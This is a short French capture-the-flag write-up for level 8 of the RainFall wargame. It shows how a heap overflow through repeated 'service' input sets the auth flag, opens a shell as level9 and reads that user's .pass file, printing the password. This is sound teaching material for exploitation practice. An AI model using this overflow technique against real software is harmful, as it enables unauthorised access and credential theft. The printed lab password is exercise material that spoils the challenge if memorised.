# LEVEL8

Grace au reverse du programme, on peut voir que pour avoir accès au shell il faut que la variable `_auth[8] != 0`, sauf que quand on utilise la commande `auth`, la variable est assigné à 0.
En testant le programme on peut voir que la mémoire ce suit, il nous suffit d'écrire suffisament de valeur avec la commande `service` pour faire un buffer_overflow sur `auth` 

```
auth user
0x804a008, (nil) 
service AAAA
0x804a008, 0x804a018 
service AAAA 
0x804a008, 0x804a028 
auth user
0x804a038, 0x804a028 
```


```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018 
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$ 
```

